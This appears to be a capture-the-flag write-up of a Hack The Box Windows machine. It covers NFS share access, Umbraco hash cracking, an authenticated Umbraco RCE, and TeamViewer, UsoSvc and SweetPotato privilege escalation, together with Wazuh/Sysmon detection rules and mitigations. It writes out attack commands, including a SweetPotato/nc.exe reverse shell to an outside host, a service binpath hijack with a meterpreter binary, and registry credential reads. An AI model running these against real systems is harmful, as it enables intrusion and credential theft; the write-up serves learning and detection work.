description: Look into NFS access that allowed for an Umbraco RCE exploit. Also explore using Wazuh with Sysmon for detection of various privilege escalation vectors.
---

### Overview

This is an easy Hack The Box machine with NFS running on Windows and a vulnerable version of Umbraco CMS. An interesting part of this box were the multiple ways to escalate privileges. I look at the NFS share settings and a way to limit access to an exposed Umbraco database file. I also use Wazuh for the first time and go over some troubleshooting steps I took to get a specific detection rule to trigger.

### Attack Tactics

#### Credential Access
After reviewing open ports from the nmap scan I didn't find anything to go off of with FTP nor SMB. Inspecting the webpage on port 80 revealed multiple references to Umbraco. Its login page was quick to uncover after manually navigating through links on each page. The login page didn't seem to use simple common credentials nor what I could quickly find searching for Umbraco defaults. Username enumeration did not seem possible either when reviewing failed authentication responses. The next ports to check, 111 and 2049 for NFS luckily showed an accessible share to everyone:

Mounting the `site_backups` share and looking through the folder structure confirmed it was accurately named with its contents being files for the Umbraco website.
```bash
sudo mount -t nfs $IP:/ ./target-nfs/ -o nolock
```

Besides wanting to immediately hunt for credentials I also wanted to find the Umbraco version. Searching quickly led to [this](https://our.umbraco.com/forum/getting-started/installing-umbraco/15892-How-to-tell-which-version-of-Umbraco-an-installation-uses) post from the Umbraco forum.

I saw 7.12.4 when doing a recursive search:
```bash
grep -ir 'umbracoConfigurationStatus" value' . 2>/dev/null
```

Further searches for "password" didn't result in anything useful and I was briefly sidetracked by a suspected mistaken password entered as the username when searching for "username" in the `/App_Data/Logs/` directory. The suspected password didn't work but it also had the username of `admin@htb.local` which later proved to be correct. Up a level in the App_Data folder was an `Umbraco.sdf` file which turned out to be the site's local database. Hashed SHA1 credentials were directly accessible in the file and quickly cracked with john the ripper and standard `rockyou.txt` wordlist.

> __Prevent:__ Some options to mitigate this would be using a newer version of NFS requiring a password, limiting access with some form of host or network firewall, using a more secure password, and what I wanted to explore--restricting access to sensitive files in the NFS share:
{: .prompt-tip}
- Kerberos can be used for authentication with [NFS version 4.1](https://datatracker.ietf.org/doc/html/rfc5661#section-1.7) rather than relying on the client/host implicitly being trusted.
- A shift to limiting NFS at the network level could be achieved by a firewall and the corresponding firewall implementation available (network, host, port, application layer, etc.).
- I looked into restricting access to files on the NFS share by initially looking at the file's permissions with `icacls`:

The Read and Execute `RX` rights with Anonymous Logon were related to the permissive access. I wanted to look at the properties easier so ran this command (post exploitation) to add the administrator account to the standard RDP group and enable access to the service:

```
net localgroup "Remote Desktop Users" administrator /add; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Opening up the properties to the folder I could see these settings:

Then looking at the `Umbraco.sdf` file properties the settings were as follows for the `Anonymous Logon` account:

![image](https://i.postimg.cc/mk9YgBsZ/remote-sdf-default.png){: width:'351' height:'456'}

These permissions were edited to check `Deny` for Read & execute as well as Read, resulting in the denied message when trying to read the contents with Anonymous access again:

#### Initial Access
From previously determining the Umbraco version, and discovering a username, the credentials were successfully tested on the Umbraco login page. A quick Google search or in GitHub revealed multiple authenticated RCE exploits. I used [this](https://github.com/noraj/Umbraco-RCE) one with a PowerShell reverse shell placed in the `-c` and `-a` parameters which returned a shell as `iis apppool\defaultapppool`.

The easiest way to prevent the CVE-2019-25137 vulnerability would be to remove access to the `xsltVisualize.aspx` page as was done in the updated Umbraco versions. An analysis of the vulnerability was done here: [CVE-2019-25137 Affected Version Research](https://github.com/Ickarah/CVE-2019-25137-Version-Research).

> __Detect:__ One way to detect this activity would be to monitor processes initiating the reverse shell. I used Sysmon logs in combination with a Wazuh rule:
{: .prompt-tip}

I used Sysmon with [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config)'s configuration file, Wazuh had pre-built rules that triggered on anomolous events after the exploit was triggered:

![image](https://i.postimg.cc/5NXdTc3K/remote-wazuh-defaults.png){: width:'1436' height:'227'}

I opted for a simple but more specific rule that would look for the web service `w3wp.exe` as the parent process and `powershell.exe` as the running process. The group names, rule id, and level values can be adjusted as needed but the the [if_sid](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html#if-sid) value is used to match on Wazuh's rule id for Sysmon process create events.

```
<group name="windows,sysmon,w3wp">
    <rule id="190001" level="13">
        <if_sid>61603</if_sid>
        <field name="win.eventdata.parentImage" type="pcre2">w3wp.exe</field>
        <field name="win.eventdata.image" type="pcre2">powershell.exe</field>
        <description>Suspicious powershell execution from w3wp</description>
    </rule>
</group>
```

#### Privilege Escalation
##### TeamViewer
Upon getting access to the machine one of the first things I checked was the file system under the `C:\Users` directory. This showed a `TeamViewer 7.lnk` in the Public Desktop. Nonstandard applications are typically good places to look for potential exploits. After verifying that TeamViewer was installed in Program Files this [manual exploit](https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat) and reference to CVE-2019-18988 allowed for quick decryption. The affected versions of TeamViewer store sensitive data with AES in the registry. As the exploit suggests this can be read with a low privilege user.

```
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
```

The Key and Initialization Vector (IV) is also provided to easily decrypt with CyberChef:

The password was reused for the local Administrator account which allowed easy shell access with evil-winrm.

> __Detect:__ Wazuh was used again to detect process creation events with `reg.exe` and TeamViewer in the commandline. The `if_sid` used here is different than in the previous Wazuh rule which is explained in the [troubleshooting](#wazuh-rule-troubleshooting) section below.
{: .prompt-tip}

```
<group name="windows,sysmon,reg">
    <rule id="190002" level="12">
        <if_sid>92025</if_sid>
        <field name="win.eventdata.commandLine" type="pcre2">TeamViewer\\\\Version7</field>
        <description>reg.exe possibly related to CVE-2019-18988</description>
    </rule>
</group>
```

##### UsoSvc
An alternative way to escalate privileges is abusing insecure permissions for the UsoSvc service. If winPEAS is ran to check for vulnerabilities it will identify "UsoSvc: AllAccess, Start" under "Modifiable Services". A meterpreter shell was used in place of the original binary path in this example:

```
net stop usosvc
sc.exe config usosvc binpath= "C:\programdata\met.exe"
net start usosvc
```

Conveniently Wazuh already had a rule that triggered on new service creation:

##### SeImpersonatePrivilege
The `defaultapppool` account also has the SeImpersonatePrivilege enabled upon checking `whoami /priv`. Among the multiple impersonation/potato exploits I tend to use [SweetPotato](https://github.com/CCob/SweetPotato).

```
.\SweetPotato.exe -e EfsRpc -p .\nc.exe - a "10.10.14.16 4444 -e cmd.exe"
```

Wazuh also had a prebuilt rule for detecting PowerShell file creation. These are certiainly good starting points and should raise alarms in combination with other surrounding activity.

### Wazuh Rule Troubleshooting
Having never used Wazuh prior to this instance I thought it was fairly intuitive to install and get setup based on what I used it for. The first rule I setup ran smoothly with no troubleshooting needed. I originally modeled the TeamViewer `reg.exe` rule off of the first one and figured I'd similarly have no issues using the same `if_sid` value of 61603 for the Sysmon process create event. After triple checking for typos, ensuring the service was running on the client and server, seeing that other Sysmon logs were being forwarded, etc. the rule would not trigger!

After some Googling I came across this Wazuh [Monitoring Sysmon](https://github.com/wazuh/wazuh/issues/4253#issuecomment-555974826) post that was helpful. Key things that it mentioned that I had not yet tried were creating this rule which should trigger for all Sysmon events:

```
<group name="windows,sysmon">
  <rule id="190003" level="3">
    <if_group>sysmon</if_group>
    <description>Windows Sysmon event. Event ID: $(win.system.eventID)</description>
    <options>no_full_log</options>
  </rule>
 </group>
 ```

 This rule did work as intended however, the goal was to get a specific rule to trigger, not to have events fire for every Sysmon event. The other mention from the above post was setting `logall` in the Wazuh manager/server's `/var/ossec/etc/ossec.conf` file to "yes". This let me verify I could see logs in the manager's archive file even if the rule was not triggering.

 The Wazuh console under "Server management" has a Ruleset Test option which seemed to be exactly what I was looking for. I copied the full json log seen from the manger's `archives.log` file and the test went through Phase 1 and 2 but nothing for Phase 3, which was what I needed to identify what rule was being matched. Searching around again I came across another post about [No Phase 3](https://groups.google.com/g/wazuh/c/UWL-BZI5c64) that cleared up why I was not seeing the Phase 3 process when testing my rule.
 
 It seems there's a known issue with certain Windows logs due to the decoders used for those events. Changing `/var/ossec/ruleset/rules/0575-win-base_rules.xml`'s rule 60000 from `windows_eventchannel` to `json` and removing `<category>ossec</category>` would allow the Ruleset Test feature to work (afterwards this needs to be set back to its [original values](https://github.com/wazuh/wazuh/blob/main/ruleset/rules/0575-win-base_rules.xml#L15)). This showed that a prebuilt Wazuh rule 92025 was triggering first for general `reg.exe` Sysmon process creation events. Changing the `if_sid` value to 92025 fixed the rule. I could have also looked for what rules may have triggered related to `reg.exe` by searching in the manager's rules, for example:

 ```bash
 sudo grep -ri -B 4 'reg.exe' /var/ossec/ruleset/rules
 ```

-  Recursive, case-insensitive search, that displays 4 lines before the pattern match.
